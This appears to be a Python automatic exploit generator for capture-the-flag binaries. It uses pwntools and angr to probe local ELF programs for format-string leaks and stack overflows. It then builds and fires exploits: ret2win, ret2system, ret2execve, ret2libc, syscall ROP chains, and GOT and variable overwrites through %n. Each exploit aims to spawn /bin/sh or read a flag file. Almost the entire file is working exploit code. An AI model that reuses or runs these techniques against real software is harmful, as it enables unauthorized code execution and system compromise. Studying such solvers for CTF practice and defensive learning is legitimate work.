from pwn import *
import os, subprocess, re, sys
import angr, angrop
import logging

# Reduce logging levels
logging.getLogger('angr').setLevel(logging.WARNING)
logging.getLogger('angrop').setLevel(logging.WARNING)
logging.getLogger('os').setLevel(logging.WARNING)
logging.getLogger('pwnlib').setLevel(logging.WARNING)

class AEG:
	def __init__(self, filepath):
		print(f'CREATING SOLVER FOR: {filepath}')
		self.file = filepath
		self.elf = ELF(filepath)
		self.rop = ROP(self.elf)
		self.funcs = self.elf.sym.keys()

	def analyze_funcs(self):
		print('ANALYZING SYMBOLS...')
		# Check for tell of a ROP problem - presence of a symbol named gadget
		self.has_gadget = False
		self.has_printf = False
		self.can_overflow = False
		self.can_leak = False
		#self.has_win = False
		for f in self.funcs:
			srch = re.search(r"gadget", f)
			if srch != None:
				print('Found a hardcoded gadget:', f)
				self.has_gadget = True
			if f == 'printf':
				print('Found a call to printf:', f)
				self.has_printf = True
			if f == 'gets':
				#print('Found a win() function:', f)
				self.can_overflow = True

	# Look at Input/Output 
	def analyze_IO(self):
		print('ANALYZING INPUT/OUTPUT...')
		p = process(self.file)
		self.num_inputs = 0
		self.input_exploits = dict()
		# This will find number of inputs, and look for any printf leaks
		while(p.poll() == None):
			if p.can_recv(timeout=1):
				try:
					line = p.recv().decode()
				except EOFError:
					continue
				srch = re.search(r'0x[0-9a-f]+', line)
				if srch != None:
					self.can_leak = True
					i = self.num_inputs
					print(f'Leak Found! Input:{i}: Output:{line}')
					# Record that this input can be attacked with print format bug
					if i in self.input_exploits.keys():
						self.input_exploits[i].append('leak')
					else:
						self.input_exploits[i] = ['leak']
						
			# Send in input	
			else:
				self.num_inputs += 1
				if self.has_printf:
					p.sendline(b'%p %p %p')
				else:
					p.sendline(b'a')

		# Now check for buffer overflows on each input
		#i = 0
		for i in range(1, self.num_inputs+1):
			log.info(f"SMASHING INPUT {i}")
			self.smash_stack(i)
			continue

	# This function attempts to smash the stack to determine if buffer overflow vulnerability exists
	def smash_stack(self, targ_input):
		p = process(self.file)
		curr_input = 1
		checked_input = False
		while p.poll() == None and not checked_input:
			if p.can_recv(timeout=1):
				try:
					p.recv()
				except EOFError:
					continue
			else:
				# Only check one input at a time
				if curr_input != targ_input:
					p.sendline(b'a')
					curr_input += 1
				else:
					checked_input = True
					# Send in cyclic pattern and check for overflow
					p.sendline(cyclic(2500, n =8))
					p.wait()
					try:
						core = p.corefile
					except:
						continue
					p.close()
					p.kill()
					if core == None:	# No core dump means no overflow
						continue
					os.remove(core.file.name)
					# Check to see if stack was so smashed that core file parsing will fail; recall function if so
					print(f'End of stack data is {core.stack.data[-8:]}')
					if (core.stack.data[-8:] != b'\x00'*8):
						log.info(f"STACK SMASHED ERROR; RETRYING INPUT{targ_input}")
						self.smash_stack(targ_input)
						continue
					padding = cyclic_find(core.read(core.rsp, 8), n=8)
					if padding == -0x1:
						# if rsp didn't give us the overflow for whatever reason, check rbp
						padding = cyclic_find(core.read(core.rbp, 8), n=8)
						# If padding still -0x1, then there is no overflow on this input
						if padding == -0x1:
							continue
						else:
							padding += 8   # add 8 to increment from rbp to return address

					# If we reach here, we found an overflow
					if targ_input in self.input_exploits.keys():
						self.input_exploits[targ_input].append(f'overflow:{padding}')
					else:
						self.input_exploits[targ_input] = [f'overflow:{padding}']



	# This function will use all the information we gathered to determine which exploit to call
	def determine_exploit(self):
		print('DETERMING EXPLOIT...')
		self.exploit = b''
		# If only one attackable input:
		if len(self.input_exploits) == 1:
			# Get which input is attackable
			num = list(self.input_exploits.keys())[0]
			for attack in self.input_exploits[num]:
				srch = re.search(r'overflow:([0-9]+)', attack)
				if srch != None:
					padding = int(srch.group(1))
					# ret2win problem
					if 'win' in self.funcs:
						print('ret2win exploit identified')
						self.ret2win(num, padding)
						return
					# ret2system problem
					elif 'system' in self.funcs:
						print('ret2system exploit identified')
						log.info('CRAFTING RET2SYSTEM EXPLOIT')
						self.ret2system(num, padding)
						return
					# execve problem
					elif 'execve' in self.funcs:
						print('ret2execve exploit identified')
						self.ret2execve(num, padding)
						return
					elif 'syscall' in self.funcs:
						print('syscall ROP identified')
						self.syscall_rop(num, padding)
						return
				# If not overflow, then string format attacks are here
				else:
					if 'pwnme' in self.funcs:
						print('overwrite global variable exploit identified')
						self.overwrite_var(num)
						return
					if 'win' in self.funcs:
						#print(self.e.data
						print('GOT overwrite exploit identified')
						self.overwrite_got(num)
						return
					# If the flag is being read into the stack
					elif 'fopen' in self.funcs:
						print('leak flag off of stack exploit identified')
						self.leak_stack(num)
						return

		# If two attackable inputs
		elif len(self.input_exploits) == 2:
			[input1, input2] = list(self.input_exploits.keys())
			# Check if attack vectors are first leak and second overflow
			if 'leak' in self.input_exploits[input1]:
				for attack in self.input_exploits[input2]:
					srch = re.search(r'overflow:([0-9]+)', attack)
					if srch != None:
						padding = int(srch.group(1))
						# Now, check if input1 is value of 0
						# In that case, leak is given to us
						if input1 == 0:
							print('ret2libc with given leak identified')
							self.ret2libc(padding)
							return
						else:
							print('format string leak to ret2libc identified')
							self.ret2libc_leak(padding)
							return

	# Leak the flag off of the stack
	def leak_stack(self, vuln_input):
		# Launch process and continually leak until we find evidence of the flag
		flag = ''
		is_flag = False
		for i in range(1000):
			p = process(self.file)
			payload = f'%{i}$p'
			p.sendline(payload.encode())
			response = p.recv().decode()
			srch = re.search(r'0x([0-9a-fA-F]+)', response)
			if srch:
				# Scan for ending brace while flag is currently found
				if '7d' in srch.group(1) and is_flag:
					srch = re.search(r'(7d[0-9a-fA-F]*)', srch.group(1))

				# Decode from hex string
				try:
					bytes_obj = bytes.fromhex(srch.group(1))
					ascii_str = bytes_obj.decode('ASCII')[::-1]
				except ValueError:
					continue

				# Check for when flag starts; concatenate until the ending brace
				if 'flag' in ascii_str:
					is_flag = True

				if is_flag == True:
					flag += ascii_str
					if '}' in ascii_str:
						break
		# Print our findings
		print(f'THE FLAG IS: {flag}')


	# Use a given leaked address to craft a ret2libc ROP chain
	def ret2libc(self, padding):
		libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
		r = ROP(libc)
		leaked = -1
		# Grab the leaked address
		p = process(self.file)
		response = p.recv().decode()
		srch = re.search(r'(0x7f[0-9a-fA-F]+)', response)
		if srch:
			leaked = int(srch.group(1), 16)
		# Determine which symbol got leaked
		for func in self.elf.got.keys():
			try:
				libc_addr = libc.sym[func]
				if (libc_addr % 4096) == (leaked % 4096):
					log.info(f'LEAKED SYMBOL IS {func}')
					# Relaunch process and get new leaked address
					p = process(self.file)
					response = p.recv().decode()
					srch = re.search(r'(0x7f[0-9a-fA-F]+)', response)
					leaked = int(srch.group(1), 16)
					libc_base = leaked - libc_addr
					log.info(f'LIBC BASE ADDRESS IS {hex(libc_base)}')
					# Make the ROP
					system = libc.sym['system'] + libc_base
					pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0] + libc_base
					binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
					exploit = b'a'*padding + p64(pop_rdi) + p64(binsh) + p64(system)
					# Fire off exploit and return
					p.sendline(exploit)
					p.interactive()
					return

			except KeyError:
				pass

	# Use format string vuln to leak a libc address, then craft ret2libc ROP chain
	def ret2libc_leak(self, padding):
		libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
		r = ROP(libc)
		case = -1
		for i in range(300):
			p = process(self.file)
			payload = f'%{i}$p'.encode()
			p.sendline(payload)
			response = p.recv().decode()
			print(f"Case#{i}:  {response}")
			# Regex to make sure we grab the leak of return to __libc_start_main()
			srch = re.search(r'0x7f[0-9a-fA-F]+e4a', response)
			if srch:
				case = i
				break
		# If leak was found
		if case != -1:
			p = process(self.file)
			payload = f'%{case}$p'.encode()
			p.sendline(payload)
			response = p.recv().decode()
			srch = re.search(r'(0x7f[0-9a-fA-F]+)', response)
			if srch:
				# Calculate libc base address
				libc_leak = int(srch.group(1), 16)
				libc_base = libc_leak - 0x27e4a
				log.info(f'LIBC BASE ADDRESS IS: {hex(libc_base)}')
				# Now begin crafting ROP
				system = libc.sym['system'] + libc_base
				pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0] + libc_base
				binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
				self.exploit = b'a'*padding + p64(pop_rdi) + p64(binsh) + p64(system)
				p.sendline(self.exploit)
				p.interactive()
				return 


	# Smash stack and change return address to win()
	def ret2win(self, vuln_input, padding):
		# Craft the exploit
		self.exploit = b'a'*padding + p64(self.elf.sym['win'])
		self.send_rop(vuln_input)


	# ROP exploit where we call system('/bin/sh') or system('cat flag.txt')
	def ret2system(self, vuln_input, padding):
		system = p64(self.elf.sym['system'])
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = self.search_elf([b'/bin/sh\x00', b'cat flag.txt\x00'])
		# If we found one of these strings, we don't need to make it. Look for pop_rdi gadget
		if targ_str != -1:
			pop_rdi = p64(self.rop.find_gadget(['pop rdi', 'ret'])[0])
			if pop_rdi:
				self.exploit = b'a'*padding + pop_rdi + p64(targ_str) + system

		# Otherwise, have to write '/bin/sh' into the binary
		else:
			data_section = self.elf.get_section_by_name(".data").header.sh_addr
			print(hex(data_section))
			angr_p = angr.Project(self.file)
			angr_rop = angr_p.analyses.ROP()
			angr_rop.find_gadgets_single_threaded()
			# Craft the chain & exploit
			chain = angr_rop.write_to_mem(data_section, b"/bin/sh\x00") + angr_rop.set_regs(rdi=data_section)
			self.exploit = b'a'*padding + chain.payload_str() + system
		# Fire off exploit
		self.send_rop(vuln_input)

			
	# ROP exploit where we call execve('/bin/sh', 0, 0) or execve('cat flag.txt', 0, 0)				
	def ret2execve(self, vuln_input, padding):
		log.info('CRAFTING EXPLOIT')
		execve = p64(self.elf.sym['execve'])
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = self.search_elf([b'/bin/sh\x00',  b'cat flag.txt\x00'])
		# If we found the target string, don't have to make it. Find pop rdi, pop rsi, and pop rdx gadgets
		if targ_str != -1:
			# Try to find gadgets with pwntools first (for speed)
			try:
				pop_rdi = p64(self.rop.find_gadget(['pop rdi', 'ret'])[0])
				pop_rsi = p64(self.rop.find_gadget(['pop rsi', 'ret'])[0])
				pop_rdx = p64(self.rop.find_gadget(['pop rdx','pop rdi', 'ret'])[0])
				self.exploit = b'a'*padding + pop_rdi + p64(targ_str) 
				self.exploit += pop_rsi + p64(0) + pop_rdx + p64(0)
				self.exploit += execve
			# Sometimes gadgets are weirdly ordered, so use angr if above didn't work
			except:
				print("Using Angrop")
				proj = angr.Project(self.file)
				arop = proj.analyses.ROP()
				arop.find_gadgets_single_threaded()
				chain = arop.set_regs(rdi=targ_str, rsi=0, rdx=0)
				self.exploit = b'a'*padding + chain.payload_str()
				self.exploit += execve
		# Account for having to write to memory
		else:
			data_section = self.elf.get_section_by_name(".data").header.sh_addr
			angr_p = angr.Project(self.file)
			angr_rop = angr_p.analyses.ROP()
			angr_rop.find_gadgets_single_threaded()
			# Craft the chain and exploit
			chain = angr_rop.write_to_mem(data_section, b"/bin/sh\x00")
			chain += angr_rop.set_regs(rdi=data_section, rsi=0, rdx=0)
			self.exploit = b'a'*padding + chain.payload_str() + execve
		# Fire off exploit
		self.send_rop(vuln_input)


	# Use format string vuln to overwrite a GOT entry
	def overwrite_got(self, vuln_input):
		# Search for offset required to do overwrite
		case = -1
		for i in range(50):
			# If we found the case, go ahead and leave loop
			if case != -1:
				break
			payload = f'%{i}$p'.encode()
			padding = b' '*(8 - (len(payload) % 8))
			payload += padding + b'AAAAAAAA'
			curr_input = 1
			p = process(self.file)
			while p.poll() == None:
				if p.can_recv(timeout=1):
					try:
						p.recv()
					except EOFError:
						return
				else:
					# Send exploit
					p.sendline(payload)
					response = p.recv().decode()
					p.kill()
					if '0x4141414141414141' in response:
						log.info(f'FOUND LEAK: Case {i}')
						case = i
						break
		# If we found correct case, then begin crafting our exploit
		if case != -1:
			targ_addr = self.elf.sym['win']
			overwrite = self.elf.got['putchar']
			self.exploit = f'%{targ_addr}d%{case+1}$n'.encode()
			padding = b' '*(8 - (len(self.exploit) % 8))
			self.exploit += padding + p64(overwrite)
			self.send_rop(vuln_input)

	# Use format string vuln to overwrite a global variable
	def overwrite_var(self, vuln_input):
		# Search for offset required to do overwrite
		case = -1
		for i in range(50):
			# Craft leak payload
			payload = f'%{i}$p'
			pad = ' '*(8 - (len(payload) % 8))
			payload += pad + 'A'*8
			p = process(self.file)
			p.sendline(payload.encode())
			response = p.recv().decode()
			if '0x4141414141414141' in response:
				case = i
				break

		# If we found the correct case, then begin crafting our exploit
		if case != -1:
			targ_val = 1337
			overwrite = self.elf.sym['pwnme']
			self.exploit = f'%{targ_val}d%{case+1}$n'.encode()
			pad = b' '*(8 - (len(self.exploit) % 8))
			self.exploit += pad + p64(overwrite)
			p = process(self.file)
			p.sendline(self.exploit)
			p.interactive()
			return

	# Generate ROP chain for calling syscall
	def syscall_rop(self, vuln_input, padding):
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = self.search_elf([b'/bin/sh\x00', b'cat flag.txt\x00'])
		# If found, get pop gadgets
		if targ_str != -1:
			proj = angr.Project(self.file)
			arop = proj.analyses.ROP()
			arop.find_gadgets_single_threaded()
			chain = arop.set_regs(rax=59, rdi=targ_str, rsi=0, rdx=0)
			self.exploit = b'a'*padding + chain.payload_str()
			self.exploit += p64(self.rop.find_gadget(['syscall'])[0])
		# Otherwise, we have to write the string into the binary
		else:
			print('Have to make the string')
			data_section = self.elf.get_section_by_name(".data").header.sh_addr
			angr_p = angr.Project(self.file)
			angr_rop = angr_p.analyses.ROP()
			angr_rop.find_gadgets_single_threaded()
			# Craft the chain and exploit
			chain = angr_rop.write_to_mem(data_section, b"/bin/sh\x00")
			chain += angr_rop.set_regs(rax=59, rdi=data_section, rsi=0, rdx=0)
			self.exploit = b'a'*padding + chain.payload_str()
			self.exploit += p64(self.rop.find_gadget(['syscall'])[0])
			
		# Fire off exploit
		self.send_rop(vuln_input)

	# Print analysis to the screen
	def get_analysis(self):
		print(f'Number of inputs: {self.num_inputs}')
		print(f'Input Attack Vectors: {self.input_exploits}')

	# Search ELF file for any of a list of strings, return address or -1 if not found
	def search_elf(self, list_str):
		target = -1
		for s in list_str:
			if len(list(self.elf.search(s))) > 0:
				target = next(self.elf.search(s))
				return target
		# If we reach here, then we didn't find any of the strings
		return -1

	# This function will send ret2win or basic ROP exploit
	def send_rop(self, vuln_input):
		curr_input = 1
		p = process(self.file)
		# Step through program and wait for vulnerable input
		while p.poll() == None:
			if p.can_recv(timeout=1):
				try:
					p.recv()
				except EOFError:
					return
			else:
				# Send exploit and switch to interactive
				if curr_input == vuln_input:
					p.sendline(self.exploit)
					p.interactive()
					try:
						p.close()
						p.kill()
					except:
						return
					return
				else:
					p.sendline(b'a')
					curr_input += 1
		# In case, close and kill the process
		try:
			p.close()
			p.kill()
		except:
			return

try:
	solver = AEG(args.BIN)

except FileNotFoundError:
	print("FileNotFoundError")
	print('Pass in a binary to exploit: python3 solarpanth3r.py BIN=<binary>')
	sys.exit()

solver.analyze_funcs()
solver.analyze_IO()
solver.get_analysis()
solver.determine_exploit()
